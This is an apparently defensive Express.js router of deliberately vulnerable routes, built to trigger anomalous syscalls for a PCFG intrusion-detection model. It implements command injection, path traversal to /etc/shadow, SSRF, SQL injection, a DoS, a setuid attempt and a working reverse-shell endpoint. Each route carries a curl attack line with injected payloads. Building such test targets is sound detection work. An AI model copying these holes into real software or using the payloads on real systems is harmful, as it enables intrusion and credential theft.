const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const http = require('http');

const router = express.Router();

/**
 * ⚠️ WARNING: INTENTIONALLY VULNERABLE ROUTES FOR DEMONSTRATION ONLY ⚠️
 * These endpoints are designed to generate anomalous system calls (like execve, 
 * unusual openat paths, and strange network sockets) that the PCFG model will catch.
 */

// 1. Command Injection (Remote Code Execution)
// Attack: curl -X POST -H "Content-Type: application/json" -d '{"host": "127.0.0.1; whoami"}' http://localhost:5000/api/vuln/ping
// Syscall Effect: Unexpected `clone`, `pipe2`, and `execve` syscalls.
router.post('/ping', (req, res) => {
    const { host } = req.body;
    // VULNERABLE: Direct concatenation of user input into shell command
    exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
        res.send({ output: stdout || stderr || (error && error.message) });
    });
});

// 2. Local File Inclusion (Path Traversal)
// Attack: curl "http://localhost:5000/api/vuln/read?file=/etc/shadow"
// Syscall Effect: Unexpected `openat` attempts in root directories, generating OS permission errors (EACCES).
router.get('/read', (req, res) => {
    const { file } = req.query;
    // VULNERABLE: Reading file directly from user input path
    try {
        const content = fs.readFileSync(file, 'utf8');
        res.send(content);
    } catch (err) {
        res.status(500).send(err.message);
    }
});

// 3. Server-Side Request Forgery (SSRF)
// Attack: curl -X POST -H "Content-Type: application/json" -d '{"url": "http://10.0.0.1:22"}' http://localhost:5000/api/vuln/fetch
// Syscall Effect: Unexpected `socket`, `connect`, and `sendto` calls to non-standard ports/IPs.
router.post('/fetch', (req, res) => {
    const { url } = req.body;
    // VULNERABLE: Server makes HTTP request to arbitrary user-provided URL
    http.get(url, (response) => {
        let data = '';
        response.on('data', chunk => data += chunk);
        response.on('end', () => res.send(data));
    }).on('error', (err) => {
        res.status(500).send(err.message);
    });
});

// 4. Simulated "Zero-Day" / Advanced Exploit Behavior
// Attack: curl -X POST http://localhost:5000/api/vuln/zeroday
// Syscall Effect: Simulates a complex memory exploit or unsafe deserialization that drops a payload to /tmp, changes permissions, and executes it. 
// This creates a highly bizarre sequence of file writes, chmod, and execve that instantly breaks the normal PCFG grammar.
router.post('/zeroday', (req, res) => {
    try {
        const fakeMalwarePath = '/tmp/simulated_payload_' + Date.now();
        // Attacker writes malicious binary to disk
        fs.writeFileSync(fakeMalwarePath, '#!/bin/sh\necho "system compromised"');
        // Attacker makes it executable
        fs.chmodSync(fakeMalwarePath, '755');
        // Attacker executes it
        exec(fakeMalwarePath, (err, stdout) => {
            fs.unlinkSync(fakeMalwarePath); // Cleanup trace
            res.send({ status: "Exploit simulated", output: stdout });
        });
    } catch (err) {
        res.status(500).send(err.message);
    }
});
// 5. Denial of Service (Memory Exhaustion Bomb)
// Attack: curl -X POST http://localhost:5000/api/vuln/dos
// Syscall Effect: Repeated `mmap` and `brk` allocations to expand memory, generating a high-volume anomaly 
// block as the process desperately asks the kernel for more RAM.
router.post('/dos', (req, res) => {
    // VULNERABLE: Unbounded memory allocation
    try {
        const bigArray = [];
        for (let i = 0; i < 10000; i++) {
            bigArray.push(Buffer.alloc(1024 * 1024, 'A')); // Allocate 10GB total (will likely crash or trigger GC thrashing)
        }
        res.send("If you see this, the server didn't crash.");
    } catch (err) {
        res.status(500).send("Memory limit reached: " + err.message);
    }
});

// 6. Reverse Shell Simulation (C2 Callout)
// Attack: curl -X POST -H "Content-Type: application/json" -d '{"ip": "127.0.0.1", "port": 4444}' http://localhost:5000/api/vuln/revshell
// Syscall Effect: An incredibly malicious sequence of `socket`, `connect`, `dup2` (duplicating standard file descriptors), 
// and `execve` (/bin/sh). This is the hallmark of a compromised server.
router.post('/revshell', (req, res) => {
    const { ip, port } = req.body;
    // VULNERABLE: Opening a reverse shell connection
    try {
        const net = require('net');
        const sh = require('child_process').spawn('/bin/sh', []);
        const client = new net.Socket();
        client.connect(port || 4444, ip || '127.0.0.1', () => {
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        res.send("Reverse shell spawned in background.");
        
        // Kill it after a few seconds so it doesn't linger
        setTimeout(() => { sh.kill(); client.destroy(); }, 3000);
    } catch (err) {
        res.status(500).send(err.message);
    }
});

// 7. Symlink Attack (File System Manipulation)
// Attack: curl -X POST -H "Content-Type: application/json" -d '{"target": "/etc/passwd", "link": "/tmp/fake_passwd"}' http://localhost:5000/api/vuln/symlink
// Syscall Effect: Generates `symlinkat` or `symlink` syscalls, which are highly unusual for an Express REST API.
router.post('/symlink', (req, res) => {
    const { target, link } = req.body;
    // VULNERABLE: Allowing arbitrary symlink creation
    try {
        fs.symlinkSync(target, link);
        res.send(`Symlink created at ${link} pointing to ${target}`);
        // Cleanup immediately so we don't pollute the system
        setTimeout(() => {
            try { fs.unlinkSync(link); } catch (e) {}
        }, 1000);
    } catch (err) {
        res.status(500).send(err.message);
    }
});

// 8. Privilege Escalation Attempt (setuid)
// Attack: curl -X POST http://localhost:5000/api/vuln/privesc
// Syscall Effect: The Node process attempts to change its user ID dynamically via `setuid` or `setresuid` syscalls, which is an immediate red flag.
router.post('/privesc', (req, res) => {
    // VULNERABLE: Application attempts to change to root privileges
    try {
        process.setuid(0); // Attempt to become root
        res.send("Successfully escalated to root!");
    } catch (err) {
        res.status(500).send("Privilege escalation failed (expected): " + err.message);
    }
});
// 9. SQL Injection (Authentication Bypass)
// Attack: curl -X POST -H "Content-Type: application/json" -d '{"email": "admin@example.com\" OR \"1\"=\"1", "password": "anything"}' http://localhost:5000/api/vuln/sqli_login
// Syscall Effect: While sqlite3 operations are normally part of the grammar, SQL injections often force the database engine 
// to perform massive full-table scans or throw parsing errors. This can generate unexpected patterns of `pread64` or `fstat` 
// on the database file that deviate from a normal index lookup.
router.post('/sqli_login', (req, res) => {
    const { email, password } = req.body;
    try {
        const { db } = require('../db');
        // VULNERABLE: String concatenation in SQL query instead of parameterized query
        const query = `SELECT * FROM users WHERE email = "${email}" AND password = "${password}"`;
        const user = db.prepare(query).get();
        
        if (user) {
            res.send(`Logged in as ${user.email} (Auth Bypass successful)`);
        } else {
            res.status(401).send("Invalid credentials");
        }
    } catch (err) {
        // SQLite will often throw an error on malformed injected SQL, which triggers an exception path anomaly
        res.status(500).send("SQL Error: " + err.message);
    }
});

// 10. SQL Injection (UNION-based Data Exfiltration)
// Attack: curl "http://localhost:5000/api/vuln/sqli_search?q=xyz%22%20UNION%20SELECT%20id,%20email,%20password,%20null,%20null,%20null,%20null,%20null%20FROM%20users--"
// Syscall Effect: Forces SQLite to execute complex subqueries and merge results, changing the memory allocation 
// pattern (`mmap`) and file read behavior compared to a standard simple SELECT.
router.get('/sqli_search', (req, res) => {
    const { q } = req.query;
    try {
        const { db } = require('../db');
        // VULNERABLE: Direct concatenation in a search query
        const query = `SELECT id, fileName, originalName FROM files WHERE originalName LIKE "%${q}%"`;
        const results = db.prepare(query).all();
        
        res.json(results);
    } catch (err) {
        res.status(500).send("SQL Error: " + err.message);
    }
});

module.exports = router;
